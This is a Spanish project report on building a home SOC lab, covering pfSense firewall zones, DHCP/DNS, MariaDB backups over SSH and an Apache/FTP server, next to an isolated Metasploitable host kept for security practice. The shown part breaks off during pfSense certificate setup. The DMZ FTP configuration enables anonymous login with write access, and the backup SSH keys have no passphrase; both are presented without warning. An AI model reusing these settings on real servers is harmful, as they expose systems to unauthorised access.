# ELABORACIÓN DE UN SOC DOMÉSTICO
##### Manuel Jesús Flores Montaño

## Tabla de contenido

- Objetivos
- Descripción del proyecto
- Repositorio oficial
- Hardware empleado
   - Equipo anfitrión
   - Router
   - Otros elementos
- Aplicaciones utilizadas
   - Sistemas operativos
   - Aplicaciones utilizadas
- Diseño de red
   - Topología
   - Planteamiento de redes
   - Tabla de direccionamiento
- Configuración de los equipos
   - Resumen de los componentes de cada máquina
   - Configuración para Atenea, Heracles y Teseo
      - Configuración general para todos
      - Configuración específica de Atenea
      - Configuración específica de Hades
      - Configuración específica de Teseo
      - Configuración específica de Heracles
   - Configuración inicial de Zeus
      - Configuración relacionada con el sistema
      - Configuración relacionada con las interfaces
      - Configuración relacionada con el firewall
      - Configuración relacionada con copias de seguridad
      - Configuración relacionada con el monitoreo
- Pruebas de funcionamiento
   - Servicio Web y FTP con certificado (HERACLES)
   - Servicio de copia de seguridad y MySQL (TESEO)
   - Servicio DNS y DHCP (ATENEA)
   - Estudio de vulnerabilidades (HADES)
- Metodología de ataque y defensa
   - Fases del ataque
      - 1. Reconocimiento
      - 2. Exploración
      - 3. Obtener Acceso
      - 4. Mantener el acceso
      - 5. Borrar huellas
   - Opciones de defensa
   - Ingeniería social y concienciación
      - Ingeniería social, ¿qué es y cómo es?
      - Concienciación
- Problemas durante el proyecto
- Observaciones y conclusión del proyecto
- Agradecimientos
- Webgrafía


## Objetivos

Es imposible negar que la seguridad se está convirtiendo a pasos cada vez mayores en un punto
a reforzar tanto de empresas como de administraciones públicas pues, como se ha ido
desarrollando a lo largo de la crisis mundial originada por el CoVid-19, varios hospitales
extranjeros han sido infectados mediante un ransomware. Este ataque se podía haber evitado
o haber disminuido su gravedad si se contaran con expertos en seguridad informática y por ello,
el objetivo principal de este proyecto es el crear un entorno desde cero de aprendizaje o de
simulación de un centro de operaciones de seguridad (SOC) para poder adquirir habilidades
tanto en seguridad como configuración de redes así como proporcionar un entorno seguro
donde ejecutar malware conocido y saber que vulnerabilidades aprovecha para realizar su
posterior explotación.

Para lograr este objetivo global se necesitan desarrollar y alcanzar objetivos individuales que se
entrelazan entre sí. Los objetivos individuales o específicos del siguiente proyecto son:

- Configurar redes virtuales que incluyan sistemas de filtrado de tráfico.
- Entender los logs ofrecidos por aplicaciones acerca del tráfico generado por todos los
    dispositivos de la red.
- Desplegar un sistema que garantice la alta disponibilidad mediante aplicaciones de
    terceros con las que se pueda analizar el tráfico, el rendimiento y adaptar el
    funcionamiento del sistema según los valores devueltos.
- Saber ejecutar escáneres de red tanto dentro como fuera de la red y ver como
    responden los sistemas a este.
- Conocer los diferentes factores de amenaza, saber analizarlos, enfrentarlos y adoptar
    medidas para evitar posibles nuevos ataques.
- Automatizar ciertas tareas como son copias de seguridad a través de la programación
    de scripts en Python.
- Analizar las aplicaciones especializadas en el mercado e intentar, en la mayor medida
    posible, usar aplicaciones de software libre.


## Descripción del proyecto

El proyecto “Elaboración de un SOC Doméstico” nace con la finalidad de, como se indicaba
anteriormente, dar una solución de aprendizaje práctico a cualquier persona en el ámbito de la
ciberseguridad sin necesidad de invertir una gran cantidad de capital en material (routers,
switches, cableado, SAIs...) ya que se trabajará todo a través de la virtualización y, en la medida
de lo posible, empleando aplicaciones de software libre aunque es cierto que en muchas
empresas se aplican soluciones de software privativo que, en caso de ser necesarias, se usarán
promociones de las empresas desarrolladoras que tienen para estudiantes del sector
(principalmente el programa Github Students).

Las tecnologías que se van a usar, nombrando por encima, serán como sistemas operativos
Ubuntu Server y Desktop, Metasploitable, Kali Linux y Windows Server 2019. Si hablamos de
nivel de aplicación se va a usar PfSense, Metasploit Framework, Ettercap o Wireshark entre otros
y, a nivel de metodología, se empleará una metodología que conocemos como Red&Blue Team.
Esta metodología está en alza y la forman titulados en el campo de seguridad informática que
tratarán de atacar (Red team) y defender (Blue team) el sistema de la empresa. Lo interesante
de esta metodología es que, aplicándolo en un entorno real, un auditor es capaz de aprender
desde ambos puntos de vista y, por tanto, poder proponer y ejecutar soluciones a medida al
sistema administrado en cuestión.

## Repositorio oficial

Toda la documentación del proyecto, así como los ficheros de configuración se podrá obtener
en el repositorio oficial de este en la siguiente URL:

```
https://github.com/manueljesus00/homelab
```

## Hardware empleado.......

El proyecto se va a realizar entero en máquinas virtuales por lo que se necesitará dos equipos
principales para el desarrollo de este proyecto. Dichos equipos son:

### Equipo anfitrión

El equipo anfitrión es un portátil MSI GP73 Leopard de 17,3''. Las características técnicas son:

- Procesador Intel Core i7-8750H
- Tarjeta gráfica NVIDIA GeForce GTX1060 6GB
- Un disco duro HDD de 1TB y un disco duro SSD de 256GB
- Conexión WLAN de 2.4GHz y 5GHz, BlueTooth y un puerto LAN de 1GB/s

El enlace del portátil es el siguiente (https://es.msi.com/Laptop/GP73-Leopard-8RD)

### Router

El router usado es un router LiveBox+ suministrado por Orange. El modelo exacto es Arcadyan
R02. Las características técnicas son:

- Modo de operación FTTH (a través de puerto Gigabit Ehternet WAN)
- 3 puertos RJ45 Gigabit Ethernet
- 2 puertos RJ11 para telefonía
- 1 puerto USB 2.0 tipo A
- Wi-Fi de Doble Banda 11ac y 11n


### Otros elementos

A parte de estos dos elementos principales contamos con los siguientes elementos
complementarios que mejoran el desarrollo del proyecto:

**_AVISO: Estos elementos no son necesarios para el funcionamiento del proyecto._**

- Pantalla AOC de 32''
- Pantalla ASUS de 20''
- SmartTV Hitachi
- Repetidor TP-Link Range Extender RE
- Telefono móvil Huawei P Smart 2019


## Aplicaciones utilizadas

Las aplicaciones utilizadas se van a dividir en dos categorías que son las propias aplicaciones y
los sistemas operativos empleados.

### Sistemas operativos

- **Microsoft Windows 10 versión Home de 64 bits.**
    o Este sistema será el usado en el equipo anfitrión para la virtualización.
    o URL: https://www.microsoft.com/es-es/windows
- **Ubuntu Server 18.04.4. LTS.**
    o Este sistema de código libre será el usado en **ATENEA, HERACLES** y **TESEO**. Es el
       que cuenta la mayoría de los servidores comerciales en el mercado y no
       contiene interfaz gráfica.
    o URL: https://ubuntu.com/download/server
- **Kali Linux 2020.1b.**
    o Este sistema operativo se compone de una suite de herramientas para realizar
       labores de pentesting y auditorías de red&blue team.
    o URL: https://www.kali.org/downloads/
- **Metasploitable 2.0.**
    o Este sistema operativo desarrollado por Rapid7 y basado en Linux está diseñado
       para que sea lo más vulnerable posible y poder entrenar a cualquier usuario en las
       técnicas de seguridad informática. Se aplicará en el servidor **HADES**.
    o URL: https://metasploit.help.rapid7.com/docs/metasploitable- 2
- **pfSense**
    o Este sistema operativo es una distribución basada en FreeBSD para ser usado como
       firewall y router. Se controla a través de una interfaz web. Se aplicará en el servidor
       **ZEUS**.
    o URL: https://www.pfsense.org/


### Aplicaciones utilizadas

Las aplicaciones que vamos a usar son:

- **Visual Studio Code**
    o Entorno de programación desarrollado por Microsoft.
    o URL: https://code.visualstudio.com/
- **KeePass**
    o Gestor de contraseñas
    o URL: https://keepass.info/
- **VMware Workstation 15**
    o Entorno de virtualización en el que ejecutaremos las máquinas virtuales.
    o URL: https://www.vmware.com/es/products/workstation-pro.html
- **Packet Tracert**
    o Simulador de redes de Cisco Systems
    o URL: https://www.netacad.com/es/courses/packet-tracer
- **nmap y zenmap**
    o Escáner de red y puertos. Viene por defecto en Kali Linux. NMAP corresponde
       a la aplicación en sí y ZENMAP corresponde a la interfaz gráfica.
    o URL: https://nmap.org
- **Wireshark**
    o Sniffer de red para capturar y analizar el tráfico. Viene por defecto en Kali
       Linux.
    o URL: https://www.wireshark.org
- **Metasploit Framework**
    o Framework desarrollado por Rapid7 que permite detectar vulnerabilidades y
       explotarlas. Viene por defecto en Kali Linux.
    o URL: https://www.metasploit.com

A parte, a lo largo de esta memoria se irán exponiendo las aplicaciones que se vayan instalando
y no aparezcan en el anterior listado.


## Diseño de red

### Topología

La topología de la red será jerárquica, es decir, tendremos un router principal ( **HOME_ROUTER** )
el cual se conectará al servidor de seguridad ( **ZEUS** ) que se encargará de filtrar los paquetes e
implementar un servidor proxy. **ZEUS** tendrá otra interfaz que se conectará a un switch ( **CORE** )
que dividirá entre DMZ (que se encontrará el servidor de acceso público ( **HERACLES** ) con
servicios WEB y FTP) y la noDMZ que será donde se encuentren los hosts y dos tipos de
servidores que son:

- **SERVIDORES DE USO NORMAL**
    Son servidores que se usan normalmente dentro de una empresa y que se encargan
    de albergar bases de datos, proporcionar un servicio de correo interno, un servicio
    de DNS interno y un servidor de copias de seguridad. Estos servidores son:

```
o ATENEA : Servicios de DNS interno y DHCP.
o TESEO : Servicio de copia de seguridad y base de datos.
```
##### • SERVIDOR DE APRENDIZAJE DE SEGURIDAD

```
Es un servidor crítico ya que contiene un sistema operativo ( metasploitable ) el cual
cuenta con numerosas vulnerabilidades. Este servidor será HADES.
```
Por tanto, la topología final que se presenta es la siguiente:


### Planteamiento de redes

Dado que pfSense nos deja tener varias redes diferentes y que puedan salir todas a Internet a
través de este y poder comunicarse con otras redes internas se definirán cuatro subredes que
son:

- LAN: 192.168.1.0/
- DMZ: 10.10.10.0/
- SEC: 10.10.20.0/
- WAN: 192.168.205.0/

El propósito de cada red es el que se indicará a continuación:

**RED LAN (RED ÁREA LOCAL)**

Otorga conectividad dentro de una red formada por empleados que necesitan acceder a
Internet y por los servidores internos. Las principales reglas de firewall que se designarán es
prohibir el acceso a la red SEC.

**RED DMZ (ZONA DESMILITARIZADA)**

Contiene un servidor web y ftp que se podrá acceder desde Internet. Las principales reglas que
le afectarán serán la limitación de puertos accesibles desde el exterior con posibilidad de ser
administrado remotamente dentro de las redes a través del puerto ssh.

**RED SEC (ZONA DE SEGURIDAD)**

Es esta red tendremos una máquina virtual que será el servidor HADES y que contiene el sistema
operativo Metasploitable para poder realizar varias prácticas de ataque y defensa de la red. A
parte, se permitirá tener varios equipos conectados para tener un laboratorio donde realizar
análisis de malware. Las reglas de firewall que se aplicarán serán la de denegar todo el tráfico
hacia el exterior de esta red salvo que se active de manera manual para ocasiones que así lo
requieran.

**RED WAN (INTERNET)**

Esta red se conectará a la red NAT del software de virtualización empleado (VMWare) para salir
al exterior. No se define ninguna regla en especial.

Para poder administrar cada una de las redes se han creado segmentos de LAN en VMware con
nombres específicos. Estos son:

- LAN: PASIR_LAN
- DMZ: PASIR_DMZ
- SEC: PASIR_SEC

La red WAN no tiene segmento LAN ya que la interfaz irá configurada en modo NAT.


### Tabla de direccionamiento

Una vez evaluada las redes que vamos a trabajar se realiza la siguiente tabla de
direccionamiento:

```
Dispositivo Interfaz IP – Máscara Gateway
Router Arcadyan LANWAN^ (*1) 192.168.1.1/2490.74.178.126/32^ 192.168.1.1--
```
##### ZEUS

```
em0 (*1) 192.168.205.128/24 192.168.205.
em1 192.168.1.1/24 192.168.205.
em2 10.10.10.1/24 192.168.205.
em3 10.10.20.1/24 192.168.205.
TESEO NIC 192.168.1.2/24 192.168.1.
ATENEA NIC 192.168.1.3/24 192.168.1.
HADES NIC 10.10.20.2/24 10.10.20.
HERACLES NIC 10.10.10.2/24 10.10.10.
```
*1 – Esta interfaz está configurada como NAT.

Las interfaces de ZEUS corresponden a:

```
Dispositivo Interfaz Segmento LAN
```
##### ZEUS

```
em0 DHCP
em1 PASIR_LAN
em2 PASIR_DMZ
em3 PASIR_SEC
```
Para los equipos de la red LAN se va a otorgar la configuración DHCP a través del servicio DHCP
configurado en ATENEA. Para ello, la configuración del pool será la siguiente:

- **RANGO DIRECCIONES:** 192.168.1.11 – 192.168.1.
- **GATEWAY:** 192.168.1.
- **MÁSCARA DE RED:** 255.255.255.0 (/24)
- **DIRECCIÓN DE BROADCAST:** 192.168.1.
- **SERVIDOR DNS:** 192.168.1.3, 192.168.1.


## Configuración de los equipos

### Resumen de los componentes de cada máquina....................................................................

Los componentes que tendrá cada máquina virtual serán los siguientes:

```
Dispositivo Inter.
Red
```
##### RAM

##### (GB)

```
Almacenamiento
(GB)
```
```
Observaciones
```
##### ZEUS 4 4 20

```
Tiene cuatro interfaces de red ya
que es el punto de frontera entre la
red exterior y las redes internas
```
##### TESEO 1 2 10/

```
Tiene dos discos duros. El primero
(10gb) es para el sistema operativo y
el segundo es para el
almacenamiento de copias de
seguridad
ATENEA 1 2 10
```
```
HADES 2 512mb 8
```
```
Se descarga directamente como
máquina virtual y con los valores
preestablecidos. Viene por defecto
con una interfaz NAT, pero se añade
una interna para el proyecto
HERACLES 1 2 10
```
### Configuración para Atenea, Heracles y Teseo

#### Configuración general para todos

El proceso de instalación de estos tres servidores es igual para cada uno de los casos. Por ello,
estos se agruparán aquí.

1. En las primeras pantallas deberemos indicar el idioma del sistema operativo, así como
    la distribución del teclado. En ambos casos le indicaremos que usaremos el español –
    España. Como apunte importante, a la hora de escoger la distribución del teclado hay
    varios tipos por lo que es recomendable usar la opción de detección automática de la
    distribución.


2. Una vez realizada las configuraciones relacionadas con el idioma vamos a asignar la
    configuración IP de las máquinas. Lo haremos de manera manual así que los campos a
    rellenar serán los indicados en la tabla de direccionamiento además del servidor DNS
    (campo _Name servers_ ) que usaremos los siguientes: _(_ **_192.168.1.3, 192.168.1.1_** _)_.
    También se nos indicará si queremos emplear un proxy pero dejaremos este campo en
    blanco.


3. A continuación, pasaremos a configurar el sistema de archivos. Para ello, en la siguiente
    pantalla indicamos que queremos usar el disco entero y, posteriormente, el disco duro
    sobre el que se instalará el sistema operativo. Finalmente, se nos mostrará un resumen
    de las particiones que deberemos confirmar. _En el caso de TESEO escogeremos también_
    _/dev/sda_.



4. Ahora pasaremos a la configuración del perfil del usuario. La contraseña se recomienda
    que no tenga nada que ver con el sistema ni con nuestra información personal, así como
    las características que siempre se recomiendan (más de ocho caracteres, combinar
    mayúsculas, minúsculas y caracteres especiales, que no sean palabras del diccionario ni
    se use en varios sistemas a la vez).
5. Una vez definido los datos de los usuarios vamos a instalar las aplicaciones básicas
    necesarias. Para ello, en la siguiente ventana nos saldrá si queremos instalar SSH. Le
    indicamos que sí y continuamos a la segunda pantalla.


6. En la siguiente ventana nos saldrá una lista de aplicaciones que podemos instalar. De
    aquí no seleccionaremos ninguna ya que esta lista está orientada a las aplicaciones en
    la nube o que trabajen con contenedores. Pasamos a la siguiente ventana donde se
    nos mostrará el log de lo que se está haciendo. Una vez finalizado ya tendremos el
    sistema instalado.

**A partir de aquí, todos los procesos de configuración de cada sistema operativo se realizarán**

### a través de conexiones SSH.


#### Configuración específica de Atenea

**_1._** Actualizaremos los repositorios del sistema. Una vez hecho instalaremos los paquetes
    _isc-dhcp-server_ para instalar el servicio DHCP y _bind9_ para instalar el servicio DNS. Para
    ello, los comandos a usar son **_apt-get update && apt-get install isc-dhcp-server bind_**
    **_- y_**


2. Una vez instaladas las aplicaciones comenzaremos a configurarlas. Empezaremos con el
    servidor DHCP. Para ello, nos dirigimos al directorio _/etc/dhcp_ y hacemos una copia de
    seguridad del fichero _dhcpd.conf_ con el comando **_cp ./dhcpd.conf ./dhcpd.conf.bk_**.
3. Ahora pasamos a modificar el fichero _dhcpd.conf_ donde crearemos nuestro nuevo pool
    de direcciones IPv4. Dicho pool tendrá la configuración indicada en la tabla de
    direccionamiento. Para ello, en el fichero se añadirá la siguiente configuración:

```
## Opciones de configuración global
## El nombre de nuestro dominio va a ser pasir1920.local
option domain-name "pasir.local";
## El servidor DNS va a ser si mismo y ZEUS (firewall)
option domain-name-servers 192.168.1.3, 192.168.1.1;
## Tiempos de concesión
default-lease-time 600;
max-lease-time 7200;
```
```
ddns-update-style none;
```
```
## Configuración de la pool
subnet 192.168.1.0 netmask 255.255.255.0 {
range 192.168.1.11 192.168.1.254;
option subnet-mask 255.255.255.0;
option routers 192.168.1.1;
option broadcast-address 192.168.1.255;
default-lease-time 600;
max-lease-time 7200;
}
```
```
Todos los ficheros de configuración se encontrarán disponibles en el repositorio del
proyecto.
```
4. A continuación, modificaremos el fichero _/etc/default/isc-dhcp/server_ y en el atributo
    _INTERFACES_ indicaremos el nombre de nuestra interfaz. Esto permitirá que podamos
    atender peticiones al servicio DHCP.

```
INTERFACESv4=”ens33”
```
5. Una vez configurado estos parámetros reiniciamos el servicio con el siguiente comando:
    **_systemctl restart isc-dhcp-server_** y comprobamos que funciona correctamente con el
    comando **_systemctl status isc-dhcp-server_**.


6. Pasemos a configurar el servicio DNS. Para ello, nos dirigimos al directorio /etc/bind y
    creamos una carpeta para nuestra zona que llamaremos _pasir1920_. Dentro de esta
    vamos a tener dos ficheros que son la copia de **_/etc/bind/db.local_** y **_/etc/bind/db.127_**.
    Estos ficheros en destino se llamarán **_db.pasir1920_** y **_db.1.168.192, db.20.10.10,_**
    **_db.10.10.10_** (el primero para la resolución directa y el otro grupo de tres ficheros para
    la resolución inversa). Una vez realizada la copia los editamos. Los ficheros finales se
    podrán ver en el repositorio, aunque a continuación se muestra una captura de pantalla
    del contenido de los distintos ficheros.


7. Una vez creado los ficheros de nuestra zona vamos a modificar el contenido del fichero
    **_/etc/bind/named.conf.options_** descomentando la sección _forwarders_ y añadimos las
    direcciones DNS de Google (8.8.8.8, 8.8.4.4). Esto lo haremos para que, en caso de no
    ser capaz nuestro servidor de resolver una petición esta se reenvíe a los servidores
    indicados. Realizamos la modificación y salimos.
8. Ahora modificaremos el fichero **_/etc/bind/named.conf.local_** para añadir las
    definiciones de zona que cubrirá nuestro servidor. Se definirán cuatro zonas que son:
       - Resolución directa de pasir1920.local
       - Resolución inversa de 192.168.1.0
       - Resolución inversa de 10.10.10.0
       - Resolución inversa de 10.10.20.0
    El fichero deberá quedar con el siguiente resultado:


9. Una vez guardado el contenido del fichero vamos a reiniciar el servicio con el comando
    **_systemctl restart bind9_** y consultamos su estado con **_systemctl status bind9_**.
10. Aquí podemos ver un ejemplo de funcionamiento con el comando **_nslookup_**


##### IMPORTANTE

En la configuración inicial de los servidores omitimos a que dominio pertenecen. Para ello,
modificaremos el contenido del fichero _/etc/hosts_ debiendo quedar de la siguiente manera (en
todos excepto en ZEUS).

En donde pone ATENEA deberemos sustituirlo en cada servidor por el nombre de este.
Igualmente, en el fichero _/etc/resolv.conf_ deberemos comprobar que el nameserver es ATENEA,
es decir, 192.168.1.3. El fichero deberá quedar de la siguiente manera:


#### Configuración específica de Hades

1. Comenzamos con la base de que HADES tendrá un sistema operativo que es
    Metasploitable2 y está diseñado para ser lo más vulnerable posible. Usaremos este
    sistema para practicar conocimientos de seguridad. Al descargarlo de su web oficial
    viene directamente como máquina virtual así que lo agregamos a VMware, asignamos
    una interfaz en segmento LAN (PASIR_SEC) y entramos dentro del servidor.
2. Aquí la configuración de red la haremos sobre el fichero de configuración
    **_/etc/network/interfaces_** directamente. El contenido del fichero deberá ser el que se
    muestra en la captura.
3. Una vez realizado, reiniciamos el servicio con el comando **_/etc/init.d/networking_**
    **_restart_**


Importante resaltar que para el servidor HADES, por cuestiones de seguridad, no va a pertenecer
al dominio _pasir1920.local_.

No realizamos ninguna configuración adicional ya que el servidor viene preparado con todas las
vulnerabilidades posibles y, en caso de necesitar realizar otras más se realizarán a nivel de
firewall en el servidor ZEUS.


#### Configuración específica de Teseo

1. Comenzamos como siempre actualizando las listas de repositorios y paquetes del
    sistema con el comando **_apt-get update && apt-get upgrade_**.
2. A continuación, comenzamos a instalar MariaDB como software de gestión de bases
    de datos. Para ello, el comando a emplear es **_apt-get install mariadb-server-10.1 -y_**.
3. Una vez instalado, realizaremos la configuración de MariaDB mediante el comando
    **_mysql_secure_installation_**. En el primer paso nos solicita una contraseña de root del
    sistema. No indicamos ninguna y continuamos. Después de esto nos indicará si
    queremos definir una contraseña. Le indicamos que sí y la creamos.


4. En las siguientes preguntas nos indicará acerca de eliminar usuarios anónimos,
    deshabilitar login remoto, borrar la base de datos _test_ y reiniciar los privilegios de tabla.
    En todos vamos a indicar que sí **a excepción de borrar la base de datos** **_test_**. Esta la
    mantendremos para tener contenido en la base de datos.
5. Una vez terminado la configuración e instalación de MariaDB pasaremos a configurar el
    servicio de copias de seguridad. Para ello, comenzaremos dando formato al segundo
    disco duro de TESEO con el comando **_mkfs.ext4 /dev/sdb_**


6. A continuación, creamos una carpeta en la raíz llamada _backups_ y montaremos el
    segundo disco duro aquí. Los comandos a ejecutar son **_mkdir /backups && mount_**
    **_/dev/sdb /backups_**
7. A su vez, vamos a generar una clave SSH para poder realizar la copia de seguridad
    mediante un script que nosotros configuremos. Para ello, crearemos un directorio en la
    raíz que llamaremos _ssh_keys._ Una vez creado, ejecutaremos el comando **_ssh-keygen -t_**
    **_rsa - f /ssh_keys/{nombre_equipo}_**. Donde _nombre_equipo_ se recomienda poner el
    nombre del servidor del cuál vamos a hacer las copias de seguridad. Cuando nos pida
    una clave no le indicaremos ninguna y continuamos.


8. Con esta clave generada la pasaremos a ATENEA a su directorio
    _/home/.ssh/authorized_keys_ para que la considere como clave de confianza.
    Emplearemos los siguientes comandos:
       scp /ssh_keys/atenea.pub manuel@atenea.pasir1920.local:
       ssh manuel@atenea.pasir1920.local
       test -d $HOME/.ssh || mkdir $HOME/.ssh
       cat $HOME/atenea.pub >> $HOME/.ssh/authorized_keys
       rm $HOME/atenea.pub
       chmod 0700 $HOME/.ssh/
       chmod 0600 $HOME/.ssh/authorized_keys
9. A continuación, nos vamos a conectar con el certificado al servidor para comprobar que
    funciona. Empleamos el comando **_ssh manuel@atenea.pasir1920.local - i_**
    **_/ssh_keys/atenea_**

```
Los pasos 7 a 9 los repetiremos para tener certificados de acceso a los servidores
HERACLES y ATENEA.
```

_10._ Una vez comprobado que funciona vamos a emplear el comando **_rsync_** para realizar las
    copias de seguridad, aunque tenemos un dilema pues queremos que las copias se
    separen por fechas así que habría que crear todos los días una carpeta. Para solucionar
    este inconveniente se programará un script el cual se encargará de realizar copias de
    seguridad tanto completas como integrales.


11. A continuación, vamos a editar el fichero _/etc/crontab_ para que se ejecute todos los días
    a las 01:30 am el script que hemos creado. Para ello, podemos emplear nano.
    Al final del fichero deberemos anexar la siguiente línea:
       30 1 * * * root sh /home/scripts/backups.sh


#### Configuración específica de Heracles

1. Comenzaremos como siempre actualizando los repositorios con apt. Una vez realizado,
    descargaremos los paquetes **apache2** y **vsftpd** para poder ofrecer los servicios web y ftp
    respectivamente.
2. A continuación, vamos a empezar configurando el servicio FTP. Para ello, abrimos con
    nano el fichero _/etc/vsftpd.conf_ y realizamos las siguientes configuraciones. _(A_
    _continuación, en una tabla, se indicará el apartado como la línea de código_
    _correspondiente. El resto de configuraciones se dejan en su valor por defecto)_
       a. Permitir que el servidor esté escuchando en IPv4 solamente.
       b. Permitir acceso anónimo.
       c. Permitir escribir en el servidor.
       d. Definir un banner personalizado.
       e. Permitir un máximo de 3 conexiones por IP.
       f. Definir el directorio para los usuarios de acceso anónimo.
       g. Activar SSL.
       h. Emplear un certificado autofirmado.
       i. Definir que vamos a usar el sistema de ficheros UTF- 8.
       j. Definir rango de puertos para modo pasivo.

```
Apartado Comando
a listen=YES^
listen_ipv6=NO
b anonymous_enable=yes
c write_enable=YES
d ftpd_banner=Bienvenido al servidor FTP de
PASIR1920.LOCAL
e max_per_ip=3
f anon_root=/home/manuel/ftp
g ssl_enable=YES
allow_anon_ssl=YES
h rsa_cert_file=/etc/ssl/certs/heracles.crt
rsa_private_key_file=/etc/ssl/private/heracles.key
i uft8_filesystem=YES^
j pasv_enable=YES^
pasv_min_port=30000
pasv_max_port=31000
pasv_address=192.168.205.128
```

```
El directorio para el apartado F ya se encuentra creado, pero no he indicado el comando
al ser básico, aunque quiero recalcar que deberemos crearlo siendo usuario estándar o,
en caso de crearlo como root, hay que definir los permisos manualmente con el comando
CHOWN.
Para los ficheros G y H se crearán a continuación los certificados.
```
```
Una vez definidos los comandos guardamos el fichero y pasamos al siguiente paso.
```
3. Para crear el certificado autofirmado vamos a emplear _openssl_. En el primer comando
    vamos a crear la clave privada con una duración de 3 años o 1095 días.
    **_openssl req -new -nodes -keyout /etc/ssl /private/heracles.key -out_**
    **_/etc/ssl/certs/heracles.csr -days 1095_**
    Nos pedirá rellenar unos datos acerca del certificado.


4. A continuación, con el fichero .key (clave privada) y .csr vamos a crear el certificado
    público autofirmado por nosotros. Para ello, el comando a emplear será:
    **_openssl x509 -req -days 1095 - in /etc/ssl/certs/heracles.csr -signkey_**
    **_/etc/ssl/private/heracles.key -out /etc/ssl/certs/heracles.crt_**
5. Reiniciamos el servicio con el comando **_systemctl start vsftpd_** y ya lo tendríamos
    funcionando.

```
En la siguiente captura tenemos un ejemplo del árbol de directorios creado
anteriormente:
```
6. Pasamos ahora a configurar el servicio web. Para ello, vamos a comenzar creando una
    página web sencilla y estática. Dicha página se ubicará en el directorio _/var/www/html_
    y se llamará _index.html_.


7. Una vez guardada la página web levantaremos el servidor con el comando **_systemctl_**
    **_restart apache2_** y comprobaremos su funcionamiento con **_systemctl status apache2_**.
8. A continuación, vamos a configurar HTTPS en nuestra página web. Para ello, vamos a
    comenzar activando el módulo SSL con el comando **_a2enmod ssl_**. Nos pedirá reiniciar el
    servicio de apache así que lo haremos con el comando anterior.
9. Siguiendo con la configuración, vamos a crear un host virtual para nuestra página. Dicho
    host virtual lo vamos a crear en el directorio _/etc/apache2/sites-available_ aprovechando
    el fichero por defecto que nos trae para configurar un sitio con SSL (default-ssl.conf). Lo
    copiamos y lo renombramos a _pasir1920.conf_
10. Editamos el fichero con nano para que, el atributo ServerAdmin sea
    _webmaster@pasir1920.local_ y SSLCertificateFile y SSLCertificateKeyFile coincida con la
    ruta de nuestra clave pública y privada creadas anteriormente.


11. Aplicamos los cambios y habilitamos el sitio con el comando **_a2ensite pasir1920.conf_**.
    También recomiendo desactivar los otros dos sitios por defecto con el comando
    **_a2dissite 000-default.conf_** y **_a2dissite default-ssl.conf_**.
12. Además, en el fichero **_apache2.conf_** añadiremos al final las siguientes líneas para que,
    si se intentase obtener la versión de apache que se está ejecutando, esta no sea
    mostrada. Una vez realizado, reiniciamos el servicio.


### Configuración inicial de Zeus

En ZEUS cambia la forma de configurar el servidor ya que lo hacemos todo mediante la interfaz
web.

1. Arrancamos el sistema con el LiveCD insertado y pulsamos la tecla _Enter_.
2. En la nueva ventana que nos aparecerá vamos a seleccionar la opción _Install_.


3. Seleccionamos la distribución de teclado que, en este caso, corresponderá con
    _es.acc.kbd keymap_ y continuamos.
4. Acerca del particionado vamos a indicar que queremos que nos lo realice de manera
    automática siguiendo UFS.
5. Una vez le damos a _OK_ se comenzará a descomprimir el sistema operativo base.


6. El resto del proceso será automatizado por lo que deberemos esperar a que cargue el
    sistema para realizar las primeras configuraciones. En este punto hemos comenzado con
    dos interfaces solo que se han ido aumentando a medida que evolucionaba la topología
    de la red. Seleccionamos la opción “2” para configurar las interfaces IP.
7. Indicamos el número de la interfaz a configurar. Siguiendo nuestra topología, la interfaz
    WAN obtendrá la dirección mediante DHCP por lo que seleccionamos la interfaz 2
    correspondiente a la LAN.


8. Indicamos la nueva dirección IP de la interfaz, el número de máscara y pulsamos _Enter_
    para indicar que es una LAN. Además, indicaremos que no queremos configurar IPv6 ni
    servicio DHCP además que si queremos usar esa IP para configurar el servidor a través
    de una GUI.

```
El procedimiento para configurar una nueva interfaz es el mismo, pero indicando en la
última opción el valor “N”. Con esto nos aseguramos de tener una única IP para acceder
al panel de control web.
```
9. Desde un cliente cualquiera nos conectamos a la misma red e ingresamos la dirección
    IP que configuramos en el paso anterior. Nos pedirán unas credenciales de acceso que
    por defecto son _admin/pfsense_.


10. En cuanto entremos nos dirigirá a un asistente de configuración. Hacemos clic sobre
    _Next_.
11. Como el primer paso es meramente formativo pasamos al segundo donde debemos
    indicar el hostname, dominio y servidores DNS. El hostname será **_zeus_** , el dominio será
    **_pasir1920.local_** y los servidores DNS serán **_192.168.1.3_** y **_8.8.8.8_**.


12. A continuación, debemos indicar un servidor de hora y su timezone correspondiente.
    Para ello, vamos a emplear el servidor NTP de CICA **_hora.cica.es_** y el timezone
    correspondiente que es **_Europe/Madrid_**.
13. Del siguiente apartado (configuración WAN) nos quedamos con que hay que indicar al
    comienzo que obtendremos la configuración IP mediante DHCP.
14. En este apartado (configuración LAN) debemos indicar la dirección IP y la máscara de
    subred. Como hemos definido esto en el paso 6 al 8 dejaremos los valores por defecto.
15. A continuación, debemos indicar una clave de administrador para no mantener la que
    trae por defecto. La escribimos y continuamos. Finalmente le damos a “Reload”.


16. Nos devolverá a la página inicial donde podremos controlar valores del sistema,
    interfaces...


#### Configuración relacionada con el sistema

_Advanced_

1. En el menú superior, en “System”, seleccionaremos “Advanced”. En la primera sección
    que nos aparecerá (Admin Access) vamos a indicar que se podrá acceder al panel de
    configuración web solo por HTTP y, por medidas de seguridad, modificaremos el puerto
    al 41500. Más adelante modificaremos el protocolo para que sea HTTPS.
2. Más abajo, en el apartado _Secure Shell_ vamos a activar el acceso por SSH y
    modificaremos el puerto de acceso al 2424 por motivos de seguridad. La modificación
    de puertos en ambos casos es para que, si un atacante ejecutase una aplicación de
    barrido de puertos como puede ser NMAP, no sea capaz de detectar los servicios al estar
    en puertos distintos a los habituales.
3. En la sección _Firewall & NAT_ , en el apartado _Network Address Translation_ , vamos a
    indicar que queremos emplear el modo _Pure NAT_.
4. En la sección _Networking_ , apartado _IPv6 Options_ vamos a denegar el tráfico IPv6. Para
    ello, desmarcamos la casilla _Allow IPv6._


5. En la sección _Notifications_ vamos a deshabilitar SMTP y Growl. Para ello, en los
    apartados correspondientes, vamos a marcar la casilla _Disable SMTP / Disable Growl_.

_Certificate Manager_

1. En la sección _Certificates_ vamos a comenzar creando una autoridad certificadora. Para
    ello, hacemos clic sobre _CA_ y rellenamos los datos que nos soliciten. Los que emplearé
    para el proyecto son los indicados en la captura. En cuanto lo tengamos listo hacemos
    clic en _Save_.


2. A continuación, hacemos clic en _Certificates_ y añadimos uno nuevo haciendo clic en
